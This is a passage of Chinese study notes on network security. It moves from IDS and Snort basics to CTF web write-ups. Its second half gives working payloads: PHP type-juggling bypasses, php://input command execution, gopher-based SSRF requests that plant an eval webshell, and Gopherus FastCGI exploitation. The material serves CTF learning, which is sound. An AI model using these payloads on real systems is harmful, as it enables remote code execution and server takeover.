Private Network)\n\n  –利用大规模网络(如Internet)上公用链路代替物理链路构建的安全专有网络。\n\n  –大型跨地域企业构建企业网的常用方案。\n\n- VPN类型\n\n  –IPSEC VPN(网络层)\n\n  –SSL VPN(传输层)\n\n- VPN产品\n\n  –国内通常在防火墙上集成\n\n  –专用VPN设备\n\n- 开源VPNOpenVPN\n\n### 13.2.4 内网安全管理\n\n- 70%以上安全事故是由网络内部原因造成的\n\n  –防火墙等边界安全防护不能应对\n\n  –内网安全管理的必要性\n\n- 内网安全管理\n\n  –有效地对内网终端进行安全管理和健康状态监控，从而增强内部网络的安全性\n\n  –终端安全管理\n\n  –终端运维管理\n\n  –终端补丁分发管理\n\n  –系统日志管理\n\n### 13.2.5 内容安全管理(SCM)\n\n- 内容安全管理SCM\n\n  –关注对网络传输内容的安全性检查\n\n- 网络行为监控\n\n  –网络行为监控审计\n\n  –绿色上网\n\n- 防虫墙/防病毒网关\n\n  –防病毒、蠕虫网关\n\n- 垃圾邮件过滤网关\n\n### 13.2.6 边界安全防御发展趋势-UTM&高性能\n\n- “胖”防火墙 转化为 UTM\n\n- UTM－统一威胁管理\n\n- Many features in one box\n\n  –网络访问与控制: 防火墙, …\n\n  –加密与身份认证: VPN, …\n\n  –SCM: 垃圾邮件过滤, 防病毒, IDS/IPS, 上网监管, …\n\n## 13.3 D：检测技术\n\n### 13.3.1 入侵检测系统基本概念\n\n- 入侵检测(Intrusion Detection)\n\n  –入侵检测，顾名思义，就是对入侵行为的检测与发现。\n\n  –入侵检测即为通过对计算机网络或计算机系统中若干关键点信息的收集和分析，从中发现入侵行为的一种安全技术。\n\n- 入侵(Intrusion)\n\n  –一次入侵可被定义为任何尝试破坏信息资源的保密性、完整性或可用性的行为。\n\n- 入侵检测系统(Intrusion Detection System)\n\n  –实现入侵检测技术，专门用于入侵行为发现和处理的软件系统或硬件设备。\n\n- 防火墙VS IDS：门卫 VS 巡逻队\n\n### 13.3.2 入侵检测技术的发展历程\n\n{% asset_img 入侵检测技术的发展历程.png 入侵检测技术的发展历程 %}\n\n#### 13.3.2.1 Denning入侵检测模型\n\n{% asset_img Denning入侵检测模型.png Denning入侵检测模型 %}\n\n#### 13.3.2.2 为什么Gartner说IDS已死\n\n- 入侵检测产品的误报、漏报和对攻击行为缺乏实时响应等问题突出，严重影响了产品发挥实际的作用。\n\n- Gartner认为IDS不能给网络带来附加的安全，反而会增加管理员的困扰，建议用户使用入侵防御系统(Intrusion Prevention System)即IPS来代替IDS。\n\n- Gartner认为只有在线的或基于主机的攻击阻止(实时拦截)才是最有效的入侵防御系统。\n\n#### 13.3.2.3 入侵威胁分类图\n\n- 入侵者分类\n\n  –外部渗透者: 攻破外部访问控制\n\n  –内部渗透者: 假冒者(攻破过程控制),违法者(误用访问), 秘密用户(攻破逻辑控制)\n\n- 检测分析模型\n\n  –误用检测：监视违反特定规则的权限误用行为，违法者检测\n\n  –异常检测：基于统计方法建立用户正常行为轮廓，假冒者检测\n\n{% asset_img 入侵检测分类图.png 入侵检测分类图 %}\n\n#### 13.3.2.4 入侵检测抽象理论模型\n\n{% asset_img 入侵检测抽象理论模型.png 入侵检测抽象理论模型 %}\n\n#### 13.3.2.5 通用入侵检测模型(CIDF)\n\nCIDF（Common Intrusion Detection Framework，通用入侵检测模型）定义了IDS表达检测信息的标准语言以及IDS组件之间的通信协议。符合CIDF规范的IDS可以共享检测信息，相互通信，协同工作，还可以与其它系统配合实施统一的配置响应和恢复策略。\n\nCIDF将一个入侵检测系统分为以下组件：\n\n- 事件产生器（Event generators）：从入侵检测系统外的整个计算环境中获得事件，并以CIDF gidos格式向系统的其他部分提供此事件。事件产生器是所有IDS所需要的，同时也是可以重用的。\n- 事件分析器（Event analyzers）：从其他组件接收gidos，分析得到的数据，并产生新的gidos。如分析器可以是一个轮廓特征引擎。\n- 响应单元（Response units ）：是对分析结果作出作出反应的功能单元，它可以终止进程、重置连接、改变文件属性等，也可以只是简单的报警。\n- 事件数据库（Event databases）：是存放各种中间和最终数据的地方的统称，它可以是复杂的数据库，也可以是简单的文本文件。\n\n{% asset_img CIDF.png CIDF %}\n\n#### 13.3.2.6 入侵检测技术评估指标\n\n- 检测率(True Positive)\n\n  –攻击事件的检出效果：检测出攻击事件数和全部攻击数之比\n\n  –漏报率(false negative) : 攻击事件没有被检测到\n\n- 误报率(False Positive)\n\n  –把正常事件识别为攻击并报警\n\n- 检测率和误报率往往不能同时很好\n\n  –“基调悖论(base-rate fallacy)”\n\n  –实际的IDS的实现总是在检测率和虚警率之间徘徊，检测率高了，虚警率就会提高;同样虚警率降低了，检测率也就会降低。一般地，IDS产品会在两者中取一个折衷，并且能够进行调整，以适应不同的网络环境。\n\n#### 13.3.2.7 IDS准确率评判标准: ROC曲线\n\n- 对比ROC曲线所围成的面积\n\n- 林肯实验室用接收器特性(ROC，Receiver Operating Characteristic)曲线来描述IDS的性能。\n\n  –ROC广泛用于输入不确定的系统的评估。\n\n  –该曲线可以刻画了IDS的检测率与误报率之间的变化关系。\n\n- 根据一个IDS在不同的条件(在允许范围内变化的阈值，例如异常检测系统的报警门限等参数)下的误报率和检测率，分别把误报率和检测率作为横坐标和纵坐标，就可做出对应于该IDS的ROC曲线。\n\n如果一条直线向上，然后向右以45度角延伸，就是一个非常失败的IDS，它毫无用处；相反，ROC曲线下方的区域越大，IDS的准确率越高。\n\n如图所示，IDS B的准确性高于IDS C，类似地，IDS A在所有的IDS中具有最高的准确性。\n\n{% asset_img ROC曲线.png ROC曲线 %}\n\n### 13.3.3 入侵检测技术\n\n- 误用检测(misuse detection)\n\n  –也称为基于特征的检测(signature-based detection)\n\n  –建立起已知攻击的特征库\n\n  –判别当前行为活动是否符合已知的攻击特征\n\n- 异常检测(anomaly detection)\n\n  –也称为基于行为的检测(behavior-based detection)\n\n  –首先建立起系统的正常模式轮廓\n\n  –若实时获得的系统或用户的轮廓值与正常值的差异超出指定的阈值，就进行入侵报警\n\n#### 13.3.3.1 误用检测\n\n- 目前研究工作比较多，并且已经进入实用\n\n  –建立起已有攻击的模式特征库\n\n  –难点在于：如何做到动态更新，自适应\n\n- 常用技术\n\n  –基于简单规则的模式匹配技术\n\n  –基于专家系统的检测技术\n\n  –基于状态转换分析的检测技术\n\n- 攻击特征提取\n\n  –专家提取\n\n  –自动提取方法(研究热点)\n\n##### 13.3.3.1.1 IDA工作原理——模式匹配\n\n- 单模式匹配\n\n  –KMP算法  Knuth-Morris-Pratt\n\n  –BM算法   Boyer-Moore\n\n- 多模式匹配\n\n  –AC算法  Aho-Corasick\n\n  –基于FSA(有限状态机)，对文本串扫描一次就可以找出匹配的所有模式\n\n##### 13.3.3.1.2 正则表达式的匹配\n\n- 正则表达式能够用来描述符合某类句法规则的字符串集，支持描述更为广泛的负载特征，这使得其能够广泛应用于入侵检测/入侵防御、病毒检测、协议识别等系统中。\n\n- 构造正则表达式对应的自动机来解决正则表达式的匹配问题是流行的技术解决手段\n\n  –基于NFA的技术易于实现，占用状态存储空间较少，但匹配速度较慢。\n\n  –基于DFA的技术具有较快的匹配速度，但会引发状态数量呈指数增加。\n\n#### 13.3.3.2 异常检测\n\n- 比较符合安全的概念，但是实现难度较大\n\n  –正常模式的知识库难以建立\n\n  –难以明确划分正常模式和异常模式\n\n- 常用技术\n\n  –统计方法\n\n  –预测模式\n\n  –神经网络\n\n### 13.3.4 入侵检测系统的分类与部署\n\n#### 13.3.4.1 基于网络的入侵检测系统(NIDS)\n\nIDS可以放在防火墙或者网关的后面，以网络嗅探器的形式捕获所有的对内对外的数据包。\n\n{% asset_img NIDS.png NIDS %}\n\n#### 13.3.4.2 基于审计的入侵检测系统(HIDS)\n\n- 安全操作系统必须具备一定的审计功能，并记录相应的安全性日志\n\n- 基于内核\n\n  从操作系统的内核接收数据\n\n- 基于应用\n\n  从正在运行的应用程序中收集数据\n\n{% asset_img HIDS.png HIDS %}\n\n#### 13.3.4.3 分布式入侵检测系统(DIDS)\n\n{% asset_img DIDS.png DIDS %}\n\n#### 13.3.4.4 入侵检测系统的部署位置\n\n- 当实际使用检测系统时，首先面临的问题就是决定应该在系统的什么位置安装检测和分析入侵行为用的感应器Sensor或检测引擎Engine。\n\n  –对于基于主机的IDS，一般来说直接将检测代理安装在受监控的主机系统上。\n\n  –对于基于网络的IDS，情况稍微复杂\n\n- IDS布局\n\n{% asset_img IDS布局.png IDS布局 %}\n\n### 13.3.5 入侵防御系统IPS\n\n- IDS与IPS\n\n  –IDS: 旁路监听，只起到Detection机制\n\n  –侧重低漏报率，造成误报率较高\n\n  –对使用者技术水平要求较高，应急响应及时\n\n- IPS:内联模式，实时处置数据包\n\n  –侧重低误报率（对正常业务不造成影响）\n\n  –高效的处理性能\n\n  –即插即用，无需使用者参与\n\n### 13.3.6 著名的开源入侵检测系统-Snort\n\n#### 13.3.6.1 Snort概述\n\nSnort是一个轻量级网络入侵检测系统，具有实时数据流分析和日志IP 网络数据包的功能，能够进行协议分析和内容搜索匹配，能够检测不同的攻击方式并对攻击进行实时报警。此外Snort 是一个跨平台、开放源代码的免费软件，所以Snort还具有很好的扩展性和可移植性。\n\n#### 13.3.6.2 Snort结构\n\nSnort主要包括四个模块：数据包嗅探器、预处理器、检测引擎和报警输出模块。\n\n{% asset_img Snort工作流程.png Snort工作流程 %}\n\n1. 数据包嗅探器模块\n\n主要用来实现网络数据包捕获和解析的功能。将捕获的网络数据包按照TCP/IP协议族的不同层次进行解析。\n\n2. 预处理器模块\n\n针对可疑行为检查包或者修改包以便检测引擎能对其正确解释，还可以对网络流进行标准化，以便检测引擎能够准确匹配特征。\n\n3. 检测引擎模块\n\n检测引擎模块是入侵检测系统实现的核心，当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块。\n\n4. 报警/日志输出模块\n\n检测引擎检查后的Snort数据需要以某种方式输出。\n\n#### 13.3.6.3 Snort规则结构\n\nSnort采用基于规则的网络入侵模式搜索机制，对网络数据包进行模式匹配，从中发现入侵或恶意攻击行为。\n\nSnort将所有已知的入侵行为以规则的形式存放在规则库中，每一条规则由规则头和规则选项两个部分组成。\n\n规则头定义了规则的动作、所匹配网络报文的协议、源地址、目的地址、源端口及目标端口等信息；规则选项部分则包含了所要显示给用户查看的警告信息以及用来判定报文是否为攻击报文的其他信息。\n\n{% asset_img snort规则结构.jpg snort规则结构 %}\n\nSnort规则头部的主要结构如下所示。\n\n{% asset_img snort规则头部.png snort规则头部 %}\n\n- 动作：当规则与包比对并符合条件时，会采取什么类型的动作。出现通常动作时产生报警或记录日志或向其他规则发出请求。\n- 协议：用来在一个特定协议的包上应用规则。\n- 地址：定义源或目的地址\n- 端口：如果协议是TCP或UDP，端口部分用来确定规则所对应的包的源及目的端口。\n- 方向：确定哪一边的地址和端口是源，哪一边是目的。\n\n例如，下述规则在探测到TTL为100的ICMP ping包时，就会产生报警：\n\n```\nalert icmp any any -> any any (msg: \"Ping with TTL=100\"; ttl: 100;)\n```\n\n括号之前的部分叫做规则头部，括号中的部分叫做规则选项。头部依次包括下面部分：\n\n1. 规则的动作：在这个规则中，动作是alert（报警），就是如果符合下面的条件，就会产生一个报警。如果产生报警，默认的情况下将会记录日志。\n2. 协议：在这个规则中，协议是ICMP，也就是说这条规则仅仅对ICMP包有效，如果一个包的协议不是ICMP， Snort探测引擎就不理会这个包以节省CPU时间。\n3. 源地址和源端口：在这个例子中，它们都被设置成了any，也就是这条规则将被应用在来自任何地方的ICMP包上，当然，端口号与ICMP是没有什么关系的，仅仅和TCP和UDP有关系。\n4. 方向：用→表示从左向右的方向，表示在这个符号的左面部分是源，右面是目的，也表示规则应用在从源到目的的包上。如果是←，那么就相反。注意，也可以用<>来表示规则将应用在所有方向上。\n5. 目的地址和端口：若都是any，则表示规则并不关心它们的目的地址。在这个规则中，由于any的作用，方向段并没有实际的作用，因为它将被应用在所有方向的ICMP包上。\n6. 在括号中的选项部分表示：如果包符合TTL=100的条件就产生一条包含文字“Ping with TTL=100”的报警。TTL是IP数据包头部字段。\n\n#### 13.3.6.4 Snort典型规则示例\n\nSnort规则的本质就是简单模式匹配，即通过对数据包的分析得到所需信息，用以匹配自身的规则库。\n\n在初始化并解析规则时，分别生成四个不同的规则树：TCP、UDP、ICMP和IP，每一个规则树即一个独立的三维链表：规则头（Rule Tree Node，RTN）、规则选项（Optional Tree Node，OTN）和指向匹配函数的指针。\n\n{% asset_img snort规则树.png snort规则树 %}\n\nSnort初始化时，会根据配置文件的要求加载相应的规则。Snort对每条规则进行三次分类：协议分类、源/目标端口分类、内容类别分类。 \n\n## 13.4 R：响应技术\n\n- 计算机及网络取证技术\n\n  –分析攻击并寻找追溯线索\n\n  –保全并提取现场证据：法律执行部门\n\n- 攻击追溯和响应\n\n  –Attacker Trace: very difficult, Step-stone attack\n\n  –以牙还牙, 以暴制暴? –并不可取\n\n- 备份恢复\n\n  –建立良好的关键数据备份习惯\n\n  –RAID冗余磁盘阵列->冷备份->双机热备（保持业务连续性）\n\n- 灾难恢复\n\n  –重要性数据的异地容灾备份：2/5的公司经历大灾难后再也不能恢复运作\n\n# 14. HTTP\n\n## 14.1 抓包关键点\n\n**Referer**\n\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。传输referer需要在页面内添加相关的代码。\n\n**User-Agent**\n\n用来传输用户使用的是什么样的浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。\n\n**X-Forwarded-For**\n\nX-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。\n如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。\n如果你使用透明代理上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息\n简单来说就是用来传输最原始ip地址的,阻止匿名请求的，但是可以通过抓包来修改。\n\n小常识：网站的目录一般都在/var/www/html/\n\n## 14.2 Tornado框架\n\nTornado框架的附属文件handler.settings中存在cookie_secret\n\n尝试：error?msg={{handler.settings}} \n\n## 14.3 备份文件\n\n备份文件常用的后缀：.rar\t.zip\t.7z\t.tar.gz\t.bak\t.swp\t.txt\t.html\n\n### 14.3.1 vim缓存\n\n在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。\n\n以 index.php 为例：第一次产生的交换文件名为 `.index.php.swp`\n\n再次意外退出后，将会产生名为 `.index.php.swo` 的交换文件\n\n第三次产生的交换文件则为 `.index.php.swn`\n\n### 14.3.2 .DS_Store文件利用\n\n.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 (直接在URL里加上`/.DS_Store`)\n\n记事本打开查找文件，放在URL上。\n\n## 14.4 弱类型绕过\n\n```\n==\t\t只要值相等\n===\t\t不仅值相等还要数据类型相同\n```\n\n例1：\n\n```php\n<?php\ninclude_once \"flag.php\";\n\nif(isset($_GET['key'])) {\n    $key = $_GET['key'];\n    if(!is_numeric($key)) {\n        exit(\"Just num!\");\n    }\n    $key = intval($key);\n    $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\";\n    if($key == $str) {\t\n        echo $flag;\n    }\n}\nelse {\n    echo \"Try to find out source file!\";\n}\n\n#payload:/?key=123\n```\n\n例2：\n\n```php\nif (isset($_POST['password'])) {\n\t$password = $_POST['password'];\n\tif (is_numeric($password)) {\n\t\techo \"password can't be number</br>\";\n\t}elseif ($password == 404) {\n\t\techo \"Password Right!</br>\";\n\t}\n}\n\n#payload:/?password=404a\n```\n\n例3：md5绕过\n\n```php\n<?php\nerror_reporting(0);\n$a = $_GET['a'];\n$b = $_GET['b'];\n\nif($a != $b && md5($a) == md5($b)){\n    echo \"<script>window.location.replace('./levell14.php')</script>\";\n}\n?>\n```\n\n（1）找出md5值都是两个0e开头的开头的。原理是php里面在做 == 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。举例：QNKCDZO、s155964671a、s1091221200a。\n\n（2）数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。 举例：a[]=1&b[]=2。做===的时候只能用数组绕过。\n\n## 14.5 序列号与反序列化\n\n```php\nserialize()\t\t序列化\nunserialize()\t反序列化\n\nO:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}\n\nO:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}\n```\n\n## 14.6 伪协议\n\n```\nphp://filter用于读取源码\n用法：php://filter/read=convert.base64-encode/resource=xxx\n\nphp://input用于执行php代码，需要POST请求提交数据\n\ndata://text/plain用于数据流的读取，如果传入的数据是php代码，就会执行代码\n用法：data://text/plain;base64,xxxx(base64编码后的数据)\n\nfile://用于访问本地文件系统\n用法：file://[文件的绝对路径]\n```\n\n### 14.6.1 data://text/plain\n\n条件\n\nallow_url_fopen: on\n\nallow_url_include: on\n\n例：[ZJCTF 2019]NiZhuanSiWei 1\n\n```php\n<?php  \n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\n$password = $_GET[\"password\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"welcome to the zjctf\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        echo \"Not now!\";\n        exit(); \n    }else{\n        include($file);  //useless.php\n        $password = unserialize($password);\n        echo $password;\n    }\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\n要从URL中输入参数text,file和password。\n\ndata://text/plain用于数据流的读取，我们用data伪协议读出text里的内容。 一般为了绕过某些过滤都会用到base64，这里没有过滤所以可以不用。\n\n```\ndata://text/plain,welcome to the zjctf\ndata://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=\n```\n\npreg_match()是执行匹配正则表达式，只要文件中有出现flag字眼，都会被过滤。此php文件还包含另一个php文件useless.php，利用php://filter来进行读取php文件，而不能直接用file=useless.php读取。\n\n```\nphp://filter/read=convert.base64-encode/resource=useless.php\n```\n\npayload：\n\n```\n/?text=data://text/plain,welcome to the zjctf&file=php://filter/read=convert.base64-encode/resource=useless.php\n```\n\n读取后会出现类似于乱码的东西，但其实那是base64编码，拿去解码，解出下面代码：\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file;  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}  \n?> \n```\n\n这里提示我们有个flag.php文件，我们直接就将变量file等于这个文件，构造一下\n\n```php\n<?php  \n\nclass Flag{  //flag.php  \n    public $file='flag.php';  \n    public function __tostring(){  \n        if(isset($this->file)){  \n            echo file_get_contents($this->file); \n            echo \"<br>\";\n        return (\"U R SO CLOSE !///COME ON PLZ\");\n        }  \n    }  \n}\n$a = new Flag();\necho serialize($a);\n?> \n//O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n这里有个问题是为什么要序列化输出变量a呢，可能是因为在存password之前把password反序列化了，即我们存进去的密码不是我们输入的密码，而是将密码反序列化后的一串东西。所以我们要得到我们输入的密码就必须将存进去的密码序列化回来。\n\n完整payload：\n\n```\n/?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:\"Flag\":1:{s:4:\"file\";s:8:\"flag.php\";}\n```\n\n### 14.6.2 php://input\n\nphp://input要求`allow_url_include`设置为`On`，所以得看看phpinfo()中的`allow_url_include`是否为`On`。\n\n然后用burpsuite抓包，发送到repeater里去，将第一行设置为\n\n```\nGET /?file=php://input HTTP/1.1\n```\n\n在最下面设置为\n\n```php\n#<?php system(\"ls /\"); ?>\tsend,返回目录\n<?php system(\"cat /falg_19485\");?>\tsend,返回flag\n```\n\n### 14.6.3 php://filter\n\n参考如下：\n\n```\nhttps://writeup.ctfhub.com/Skill/Web/RCE/366Ttyc8tGBiCyo54pR8YR.html\n```\n\n## 14.7 请求方式\n\n请求方式可以自定义。\n\n```\nGET /index.php HTTP/1.1\nCTFHUB /index.php HTTP/1.1\n```\n\n## 14.8 302跳转\n\n302跳转将包发送到repeater模块查看响应包，因为在HTTP history模块里好像看不到响应包。\n\n查看源代码链接指向index.php，然而在URL上看跳转到了index.html，所以发生了302跳转。\n\n## 14.9 Cookie\n\ncookie伪造，欺骗。直接在cookie管理器里修改。比如admin=0改为admin=1\n\n## 14.10 基本认证\n\n在HTTP中对于基础认证的一些知识，要求使用爆破的方法来获得基础认证的账号密码，之后登陆获得flag。\n\n如何在burpsuite构造payload：\n\nhttps://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html\n\n# 15. 信息泄露\n\n## 15.1 Git泄露\n\n当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 \n\n### 15.1.1 Log\n\nGithack：.git泄露利用工具，可还原历史版本。\n\n使用方法：\n\n```\npython GitHack.py http://www.example.com/.git/\n```\n\n### 15.1.2 Stash\n\n### 15.1.3 Index\n\n## 15.2 SVN泄露\n\n## 15.3 HG泄露\n\n# 16. 服务端请求伪造(SSRF)\n\n## 16.1 内网访问\n\n```\nhttp://xxxx/?url=127.0.0.1/flag.php\n```\n\n小知识点，file://可以查看源码，前提要知道路径。这也是表示有SSRF漏洞的关键点。\n\n```\n?url=file:///var/www/html/flag.php\n```\n\n## 16.2 伪协议读取文件\n\n了解伪协议：https://www.cnblogs.com/-mo-/p/11673190.html\n\n```\nfile:// – 本地文件传输协议，主要用于访问本地计算机中的文件。\n\ndict:// – 字典服务器协议，dict是基于查询相应的TCP协议。\n\nsftp:// – SSH文件传输协议或安全文件传输协议（Secure File Transfer Protocol）是一种简单的基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。\n\nldap:// – 代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。\n\ntftp:// – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。\n\ngopher:// – 是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。\n```\n\n## 16.3 端口扫描\n\n```\nhttp://xxxx/?url=127.0.0.1:8000\n题目会给端口号范围，用burpsuite爆破端口号\n```\n\n## 16.4 POST请求\n\n> 这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 \n>\n> http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=_\n\n打开什么都没有，尝试一下10.1的内网访问\n\n> http://challenge-06817def2881c17e.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n\n查看源码发现信息：\n\n```html\n<form action=\"/flag.php\" method=\"post\">\n<input type=\"text\" name=\"key\">\n<!-- Debug: key=0dc2b8bce30276f8d0f0cb1472eb6c7d-->\n</form>\n```\n\n是一个表单，要用POST方式提交key到flag.php上。因为要发送的不是php代码所以不能用php://input方式，但可以用gopher协议(curl支持gopher伪协议)。\n\n```\ngopher://ip:port/_payload(注意有下划线)\n```\n\n构造POST内容，特别要注意Content-Length应为key的整个长度。将内容拿去URL编码2次(按理说是3次，但我们是在URL上构造，最后一次编码按回车浏览器会自动帮我们第3次编码)，第一次URL编码后要手动在所有%0A前面加上%0D(%0A是在linux系统中代表换行符，在windows中是%0D0A代表换行符，但是网上的编码器大都是编码的%0A，所以我们需要改成windows能够识别的)，再进行后续编码。\n\n```\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1:80\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=0dc2b8bce30276f8d0f0cb1472eb6c7d\n```\n\n```\n//第1次URL编码\nPOST%20/flag.php%20HTTP/1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application/x-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//加上%0D\nPOST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//第2次URL编码\nPOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d\n//构造URL\n/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0dc2b8bce30276f8d0f0cb1472eb6c7d\n```\n\n## 16.5 上传文件\n\n> 这次需要上传一个文件到flag.php了.祝你好运\n\n题目提示有flag.php，先打开看看\n\n```\nhttp://challenge-1897762186ae66ce.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php\n```\n\n发现有上传文件的接口，但没有提交按钮。那就自己做一个。\n\n```html\n<input type=\"submit\" value=\"提交\">\n```\n\n直接这样提交一句话木马的话会出现\n\n>  Just View From 127.0.0.1 \n\n那我们抓一个包来用gopher构造\n\n```\nPOST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: multipart/form-data; boundary=---------------------------1114439304559070182630578745\nContent-Length: 287\n\n-----------------------------1114439304559070182630578745\nContent-Disposition: form-data; name=\"file\"; filename=\"shell1.php\"\nContent-Type: application/octet-stream\n\n<?php \necho \"hello world\";\neval($_POST['caidao']); ?>\n-----------------------------1114439304559070182630578745--\n```\n\n进行两次URL编码\n\n```\n//第1次\nPOST%20/flag.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20multipart/form-data%3B%20boundary%3D---------------------------1114439304559070182630578745%0D%0AContent-Length%3A%20287%0D%0A%0D%0A-----------------------------1114439304559070182630578745%0D%0AContent-Disposition%3A%20form-data%3B%20name%3D%22file%22%3B%20filename%3D%22shell1.php%22%0D%0AContent-Type%3A%20application/octet-stream%0D%0A%0D%0A%3C%3Fphp%20%0D%0Aecho%20%22hello%20world%22%3B%0D%0Aeval%28%24_POST%5B%27caidao%27%5D%29%3B%20%3F%3E%0D%0A-----------------------------1114439304559070182630578745--\n//第2次\nPOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--\n//构造URL\n/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------1114439304559070182630578745%250D%250AContent-Length%253A%2520287%250D%250A%250D%250A-----------------------------1114439304559070182630578745%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522shell1.php%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A%250D%250A%253C%253Fphp%2520%250D%250Aecho%2520%2522hello%2520world%2522%253B%250D%250Aeval%2528%2524_POST%255B%2527caidao%2527%255D%2529%253B%2520%253F%253E%250D%250A-----------------------------1114439304559070182630578745--\n```\n\n```\nctfhub{58dfbf57568807f03726d88b}\n```\n\n## 16.6 FastCGI协议\n\ngopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。\n\nFastCGI协议分析\n\nhttps://blog.csdn.net/mysteryflower/article/details/94386461\n\n方法一：利用脚本\n\nhttps://blog.csdn.net/qq_51652864/article/details/118697060\n\n监听端口\n\n```\nnc -lvvp 9000 > 1.txt \t//监听的内容写到1.txt去\n```\n\n方法二：利用gopherus\n\nGopherus安装\n\n```\ngit clone https://github.com/tarunkant/Gopherus\n```\n\n去到Gopherus目录，利用fastcgi\n\n```\npython gopherus.py --exploit fastcgi\n```\n\n填入`/var/www/html/index.php `和`whoami`，获得payload\n\n```\nif you don't know press ENTER we have default one:  /var/www/html/index.php  \nTerminal command to run:  whoami\n\nYour gopher link is ready to do SSRF:                 